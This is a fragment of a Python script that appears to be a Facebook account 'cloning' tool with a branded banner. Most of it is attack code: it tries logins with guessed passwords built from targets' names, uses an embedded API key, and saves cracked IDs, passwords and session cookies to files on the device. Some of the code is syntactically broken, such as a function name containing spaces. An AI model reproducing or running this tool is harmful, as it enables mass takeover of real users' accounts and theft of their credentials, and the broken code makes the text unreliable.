...
[•] GITHUB     : \033[1;32mRJ Raju Razz\033[1;37m 
[•] TOOL TYPE  : \033[1;32mCLONING\033[1;37m
[•] STATUS     : \033[1;32mPREMIUM\033[1;37m
--------------------------------------------------
[•] \033[1;37mVERSION    :\033[1;32m 4.1\033[1;37m
[•]\033[1;31m AXOMIYA\033[1;36m  HOI\033[1;34mBEE \033[1;37mKELA😈⚡🔥
...
def RJ Raju Razz():   
    ...
    print(f'[F] Follow Facebook Profile ')
    print('')
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
                ...
                if 'session_key' in q:
                    ...
                    oks.append(sid)
                    open('/sdcard/RJ Raju Razz_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/RJ Raju Razz_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[RJ Raju Razz] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
